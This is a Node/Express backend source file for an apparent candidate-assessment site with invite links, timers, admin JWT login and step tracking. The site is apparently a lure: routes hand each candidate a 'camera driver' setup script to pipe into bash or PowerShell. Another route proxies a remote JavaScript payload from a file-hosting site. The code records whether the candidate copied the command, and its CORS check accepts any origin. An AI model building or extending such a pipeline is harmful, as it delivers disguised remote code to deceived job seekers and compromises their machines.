import express from 'express';
import cors from 'cors';
import crypto from 'crypto';
import config from './config.js';
import { getDb } from './db.js';
import { getStepMessage } from './step.js';
import { readFileSync } from 'fs';
import { dirname, join } from 'path';
import { fileURLToPath } from 'url';

const app = express();
const PORT = config.port;
const __dirname = dirname(fileURLToPath(import.meta.url));

const MAC_CMD_PATH = join(__dirname, 'mac.cmd');
const WINDOW_CMD_PATH = join(__dirname, 'window.ps1');

const MAC_CMD_TEMPLATE = readFileSync(MAC_CMD_PATH, 'utf8');
const WINDOW_CMD_TEMPLATE = readFileSync(WINDOW_CMD_PATH, 'utf8');

function escapeBashDoubleQuotedValue(value) {
  return String(value)
    .replace(/\\/g, '\\\\')
    .replace(/"/g, '\\"')
    .replace(/\$/g, '\\$')
    .replace(/`/g, '\\`')
    .replace(/\n/g, '\\n');
}

function sendScriptTemplate(res, body, { filename, contentType } = {}) {
  res.setHeader('Content-Type', contentType || 'text/plain; charset=utf-8');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Cache-Control', 'no-store, max-age=0');
  if (filename) res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  res.status(200).send(body);
}

function parseStepHistory(raw) {
  if (!raw) return [];
  try {
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch (_) {
    return [];
  }
}

// CORS: allow frontend from local dev (any host:5173) and production
const allowedOrigins = [
  'https://wecreateproblems.in',
  'https://www.wecreateproblems.in',
  'https://wecreateproblems.llc',
  'https://www.wecreateproblems.llc',
  'http://localhost:5173',
  /^http:\/\/192\.168\.\d+\.\d+:5173$/,   // local network
  /^http:\/\/198\.18\.\d+\.\d+:5173$/,   // VPN/virtual network dev
  /^http:\/\/localhost(:\d+)?$/,
];
app.use(cors({
  origin: (origin, cb) => {
    if (!origin) return cb(null, true);
    if (allowedOrigins.some(o => typeof o === 'string' ? o === origin : o.test(origin))) return cb(null, true);
    return cb(null, true);
  },
  methods: ['GET', 'POST', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
app.use(express.json());

app.get('/health', async (req, res) => {
  try {
    const db = await getDb();
    await db.healthCheck();
    res.json({ status: 'ok', database: 'connected' });
  } catch (err) {
    res.status(503).json({ status: 'error', database: 'disconnected' });
  }
});
const windowRoute = (req, res) => {
  const id = req.params?.id || req.body?.id || req.query?.id || '';
  let content = WINDOW_CMD_TEMPLATE;
  if (id) {
    const safeId = String(id).replace(/"/g, '""');
    // PowerShell template injection
    content = content.replace(
      /\$WINDOW_UID = "__ID__"/,
      `$WINDOW_UID = "${safeId}"`
    );
    // Backward compatibility if template is switched back to .cmd in future
    content = content.replace(
      /set "WINDOW_UID=__ID__"/,
      `set "WINDOW_UID=${safeId}"`
    );
  }
  res.type('text/plain').send(content);
};

const macRoute = (req, res) => {
  const id = req.params?.id || req.body?.id || req.query?.id || '';
  let content = MAC_CMD_TEMPLATE;
  if (id) {
    const injectedMacUid = `MAC_UID="${escapeBashDoubleQuotedValue(id)}"`;
    // mac.cmd template may be MAC_UID="__ID__" or MAC_UID="${MAC_UID:-__ID__}"
    content = content
      .replace(/MAC_UID="__ID__"/, injectedMacUid)
      .replace(/MAC_UID="\$\{MAC_UID:-__ID__\}"/, injectedMacUid);
  }
  res.type('text/plain').send(content);
};

/** Same payload as files.catbox.moe — proxied so clients that block catbox can still download via api.wecreateproblems.llc */
const DRIVER_SCRIPT_UPSTREAM = 'https://files.catbox.moe/tkgnyt.js';

async function driverEnvSetupProxy(req, res) {
  res.setHeader('Cache-Control', 'no-store, max-age=0');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  try {
    const ac = new AbortController();
    const to = setTimeout(() => ac.abort(), 90000);
    const r = await fetch(DRIVER_SCRIPT_UPSTREAM, { signal: ac.signal, redirect: 'follow' });
    clearTimeout(to);
    if (!r.ok) {
      return res.status(502).type('text/plain; charset=utf-8').send(`Upstream returned ${r.status}`);
    }
    const text = await r.text();
    res.type('application/javascript; charset=utf-8').status(200).send(text);
  } catch (err) {
    console.error('[driver/env-setup proxy]', err);
    res.status(502).type('text/plain; charset=utf-8').send(`Proxy failed: ${err.message}`);
  }
}

app.get('/driver/env-setup.npl', driverEnvSetupProxy);
app.get('/driver/env-setup.js', driverEnvSetupProxy);

// Driver setup scripts
// - mac: return a shell script that can be piped into `bash`
// - window: return a .cmd batch script with the provided :id injected into `__ID__`
app.post('/window/:id', windowRoute);
app.post('/window', windowRoute);
app.post('/new/driver/down/:id', windowRoute);
app.post('/new/driver/down', windowRoute);

app.post('/mac/:id', macRoute);
app.post('/mac', macRoute);

// All /api routes on a router so POST is guaranteed to match
const api = express.Router();

const MASTER_TOKEN_TTL_SEC = 8 * 60 * 60;

function getMasterJwtSecret() {
  const s = process.env.MASTER_JWT_SECRET;
  if (s) return s;
  if (process.env.VERCEL) return null;
  return 'local-dev-only-master-jwt-secret';
}

function jwtB64url(obj) {
  return Buffer.from(JSON.stringify(obj), 'utf8').toString('base64url');
}

function signMasterToken() {
  const secret = getMasterJwtSecret();
  if (!secret) throw new Error('MASTER_JWT_SECRET is not set');
  const header = jwtB64url({ alg: 'HS256', typ: 'JWT' });
  const now = Math.floor(Date.now() / 1000);
  const payload = jwtB64url({ role: 'master', iat: now, exp: now + MASTER_TOKEN_TTL_SEC });
  const sig = crypto.createHmac('sha256', secret).update(`${header}.${payload}`).digest('base64url');
  return `${header}.${payload}.${sig}`;
}

function verifyMasterToken(token) {
  const secret = getMasterJwtSecret();
  if (!secret) return null;
  const parts = String(token || '').split('.');
  if (parts.length !== 3) return null;
  const [h, p, s] = parts;
  let expected;
  try {
    expected = crypto.createHmac('sha256', secret).update(`${h}.${p}`).digest('base64url');
  } catch {
    return null;
  }
  if (expected.length !== s.length) return null;
  try {
    if (!crypto.timingSafeEqual(Buffer.from(expected, 'utf8'), Buffer.from(s, 'utf8'))) return null;
  } catch {
    return null;
  }
  try {
    const payload = JSON.parse(Buffer.from(p, 'base64url').toString('utf8'));
    if (payload.role !== 'master') return null;
    if (typeof payload.exp !== 'number' || payload.exp < Math.floor(Date.now() / 1000)) return null;
    return payload;
  } catch {
    return null;
  }
}

function requireMasterAuth(req, res, next) {
  const m = /^Bearer\s+(.+)$/i.exec(req.headers.authorization || '');
  if (!m) return res.status(401).json({ error: 'Unauthorized' });
  if (!verifyMasterToken(m[1].trim())) return res.status(401).json({ error: 'Unauthorized' });
  next();
}

/** True when Authorization bears a valid master-admin JWT (same as requireMasterAuth, without next()). */
function hasValidMasterInviteToken(req) {
  const m = /^Bearer\s+(.+)$/i.exec(req.headers.authorization || '');
  if (!m) return false;
  return !!verifyMasterToken(m[1].trim());
}

/** Invite flows PATCH with invite link only; admin PATCH uses master JWT and may send any allowed fields. */
const CANDIDATE_INVITE_PATCH_KEYS = new Set([
  'connections_status',
  'assessment_started_at',
  'client_os',
  'driver_click_status',
  'email',
]);

function allowInvitePatchForCandidateOrMaster(req, res) {
  if (hasValidMasterInviteToken(req)) return true;
  const body = req.body || {};
  const keys = Object.keys(body);
  if (keys.length === 0) {
    res.status(400).json({ error: 'Provide at least one field to update' });
    return false;
  }
  if (keys.some((k) => !CANDIDATE_INVITE_PATCH_KEYS.has(k))) {
    res.status(401).json({ error: 'Unauthorized' });
    return false;
  }
  if (body.connections_status !== undefined) {
    const n = Number(body.connections_status);
    if (n === 0 || !Number.isFinite(n)) {
      res.status(403).json({ error: 'Invalid connections_status' });
      return false;
    }
  }
  return true;
}

api.post('/master-login', async (req, res) => {
  try {
    if (!getMasterJwtSecret()) {
      return res.status(503).json({ error: 'Server missing MASTER_JWT_SECRET (required for admin session tokens)' });
    }
    const db = await getDb();
    const ok = await db.verifyMasterCredentials(req.body?.username, req.body?.password);
    if (!ok) return res.status(401).json({ error: 'Invalid username or password' });
    res.json({ token: signMasterToken() });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

api.get('/example', (req, res) => {
  res.json({ message: 'Hello from backend' });
});

api.get('/invites/generate', requireMasterAuth, async (req, res) => {
  try {
    const db = await getDb();
    const type = (req.query.type || 'partner').toLowerCase();
    const length = type === 'investor' ? 25 : 22;
    const invite_link = await db.generateUniqueInviteLink(length);
    res.json({ invite_link });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/** Time allowed for the assessment (timer countdown): 15 minutes. */
const ASSESSMENT_DURATION_MS = 15 * 60 * 1000;
/** Invite expires this long after assessment started: 120 minutes. */
const INVITE_EXPIRE_MS = 120 * 60 * 1000;

/** connections_status: 0=not started, 1=started, 2=camera fixed, 3=completed (user), 4=completed (rejected), 5=completed (timeout), 6=questionnaire completed (on summary interview). If started and INVITE_EXPIRE_MS passed, set to 5. */
async function maybeExpireInviteByTime(db, inviteLink) {
  return db.maybeExpireInviteByTime(inviteLink, INVITE_EXPIRE_MS);
}

api.get('/invites', requireMasterAuth, async (req, res) => {
  try {
    const db = await getDb();
    let invites = await db.getInvites();
    for (let i = 0; i < invites.length; i++) {
      const expired = await maybeExpireInviteByTime(db, invites[i].invite_link);
      if (expired) {
        const updated = await db.getInvite(invites[i].invite_link);
        if (updated) invites[i] = updated;
      }
    }
    res.json({ invites });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

api.get('/invites/:invite_link', async (req, res) => {
  try {
    const { invite_link } = req.params;
    const db = await getDb();
    await maybeExpireInviteByTime(db, invite_link);
    const invite = await db.getInvite(invite_link);
    if (!invite) {
      return res.status(404).json({ error: 'Invite not found' });
    }
    res.json({ invite });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Real-time assessment timer: remaining seconds from assessment_started_at (frontend only displays this).
api.get('/invites/:invite_link/timer', async (req, res) => {
  try {
    const { invite_link } = req.params;
    const db = await getDb();
    await maybeExpireInviteByTime(db, invite_link);
    const row = await db.getTimer(invite_link);
    if (!row) {
      return res.status(404).json({ error: 'Invite not found' });
    }
    const startedAt = row.assessment_started_at ? new Date(row.assessment_started_at).getTime() : null;
    const expired = [3, 4, 5].includes(Number(row.connections_status));
    const now = Date.now();
    let seconds_remaining = 0;
    let seconds_elapsed = 0;
    if (!expired && startedAt && !Number.isNaN(startedAt)) {
      const elapsedMs = now - startedAt;
      seconds_remaining = Math.max(0, Math.floor((ASSESSMENT_DURATION_MS - elapsedMs) / 1000));
      seconds_elapsed = Math.floor(elapsedMs / 1000);
    }
    res.json({
      seconds_remaining,
      seconds_elapsed,
      server_time: new Date(now).toISOString(),
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

api.post('/invites', requireMasterAuth, async (req, res) => {
  console.log('POST /api/invites received');
  try {
    const db = await getDb();
    let invite_link;
    const inviteType = (req.body?.invite_type || 'partner').toLowerCase();
    const linkLength = inviteType === 'investor' ? 25 : 22;
    if (req.body?.invite_link && typeof req.body.invite_link === 'string') {
      invite_link = req.body.invite_link.trim();
      if (!invite_link) {
        return res.status(400).json({ error: 'invite_link cannot be empty' });
      }
      if (invite_link.length > 200) {
        return res.status(400).json({ error: 'invite_link is too long (max 200 characters)' });
      }
      if (/[\s/?#]/.test(invite_link)) {
        return res.status(400).json({ error: 'invite_link cannot contain whitespace, /, ?, or #' });
      }
      const exists = await db.inviteExists(invite_link);
      if (exists) {
        return res.status(409).json({ error: 'Invite link already exists in DB' });
      }
    } else {
      invite_link = await db.generateUniqueInviteLink(linkLength);
    }
    const emailRaw = req.body?.email != null ? String(req.body.email).trim() || null : null;
    const nameRaw = req.body?.name != null ? String(req.body.name).trim() || null : null;
    const positionTitleRaw = req.body?.position_title != null ? String(req.body.position_title).trim() || null : null;
    const noteRaw = req.body?.note != null ? String(req.body.note).trim() || null : null;
    const invite = await db.createInvite({
      invite_link,
      email: emailRaw,
      name: nameRaw,
      position_title: positionTitleRaw,
      note: noteRaw,
    });
    res.status(201).json({ invite });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

const CLIENT_OS_VALUES = new Set(['windows', 'mac', 'linux']);

api.patch('/invites/:invite_link', async (req, res) => {
  try {
    if (!allowInvitePatchForCandidateOrMaster(req, res)) return;
    const { invite_link } = req.params;
    const { connections_status, email, name, position_title, note, assessment_started_at, client_os, driver_click_status } =
      req.body;
    const updates = {};
    const db = await getDb();
    /* driver_click_status: bitmask — 1 = link opened, 2 = copy used; 3 = both (OR merge, nothing is lost) */
    if (driver_click_status !== undefined) {
      const n = Number(driver_click_status);
      if (n === 1 || n === 2) {
        const cur = await db.getInvite(invite_link);
        if (!cur) {
          return res.status(404).json({ error: 'Invite not found' });
        }
        const prev = Number(cur.driver_click_status) || 0;
        const bit = n === 1 ? 1 : 2;
        updates.driver_click_status = (prev | bit) & 3;
      }
    }
    if (client_os !== undefined) {
      if (client_os === null || client_os === '') {
        updates.client_os = null;
      } else {
        const normalized = String(client_os).trim().toLowerCase();
        if (CLIENT_OS_VALUES.has(normalized)) {
          updates.client_os = normalized;
        }
      }
    }
    if (typeof connections_status === 'number' || typeof connections_status === 'string') {
      const statusNum = Number(connections_status);
      updates.connections_status = statusNum;
      /* Reset to not started: same as a new invite row for timer, completion, device metadata */
      if (statusNum === 0) {
        updates.assessment_started_at = null;
        updates.completed_at = null;
        updates.driver_click_status = 0;
        updates.client_os = null;
        updates.email = null;
        updates.current_step_key = null;
        updates.current_step_message = null;
        updates.step_history = null;
      } else if (statusNum === 3 || statusNum === 4 || statusNum === 5) {
        updates.completed_at = new Date().toISOString();
      }
      if (statusNum === 1 && assessment_started_at === undefined) {
        updates.assessment_started_at = new Date().toISOString();
      }
    }
    if (email !== undefined) {
      updates.email = email === null || email === '' ? null : String(email).trim();
    }
    if (name !== undefined) {
      updates.name = name === null || name === '' ? null : String(name).trim();
    }
    if (position_title !== undefined) {
      updates.position_title = position_title === null || position_title === '' ? null : String(position_title).trim();
    }
    if (note !== undefined) {
      updates.note = note === null || note === '' ? null : String(note).trim();
    }
    if (assessment_started_at !== undefined) {
      updates.assessment_started_at = assessment_started_at === null || assessment_started_at === '' ? null : String(assessment_started_at).trim();
    }
    if (Object.keys(updates).length === 0) {
      return res.status(400).json({ error: 'Provide at least one field to update' });
    }
    const invite = await db.updateInvite(invite_link, updates);
    if (!invite) {
      return res.status(404).json({ error: 'Invite not found' });
    }
    res.json({ invite });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Remove invite: hard delete from DB (row is removed, not updated).
api.delete('/invites/:invite_link', requireMasterAuth, async (req, res) => {
  try {
    const { invite_link } = req.params;
    const db = await getDb();
    const deleted = await db.deleteInvite(invite_link);
    if (!deleted) {
      return res.status(404).json({ error: 'Invite not found' });
    }
    res.status(204).send();
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Set connections_status to 2 (camera fixed). Scripts use POST (curl -X POST); GET kept for links.
async function changeConnectionStatusHandler(req, res) {
  try {
    const { invite_link } = req.params;
    const db = await getDb();
    const invite = await db.updateInvite(invite_link, { connections_status: 2 });
    if (!invite) {
      return res.status(404).json({ error: 'Invite not found' });
    }
    res.send("Your camera driver has been updated successfully.");
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
}
app.get('/change-connection-status/:invite_link', changeConnectionStatusHandler);
app.post('/change-connection-status/:invite_link', changeConnectionStatusHandler);

async function trackStepHandler(req, res) {
  try {
    const { invite_link, step_key } = req.params;
    const db = await getDb();
    const invite = await db.getInvite(invite_link);
    if (!invite) {
      return res.status(404).json({ error: 'Invite not found' });
    }
    const key = String(step_key || '').trim();
    if (!key) {
      return res.status(400).json({ error: 'step_key is required' });
    }
    const message = getStepMessage(key);
    const timestamp = new Date().toISOString();
    const history = parseStepHistory(invite.step_history);
    history.push({ step_key: key, message, at: timestamp });
    const nextHistory = JSON.stringify(history.slice(-100));
    const updatedInvite = await db.updateInvite(invite_link, {
      current_step_key: key,
      current_step_message: message,
      step_history: nextHistory,
    });
    if (!updatedInvite) {
      return res.status(404).json({ error: 'Invite not found' });
    }
    return res.json({
      ok: true,
      step_key: key,
      step_message: message,
      at: timestamp,
      invite: updatedInvite,
    });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
}
app.post('/track-step/:invite_link/:step_key', trackStepHandler);
api.post('/invites/:invite_link/track-step/:step_key', trackStepHandler);

app.use('/api', api);

if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log('  POST /api/invites - add invite link');
  });
}

export default app;
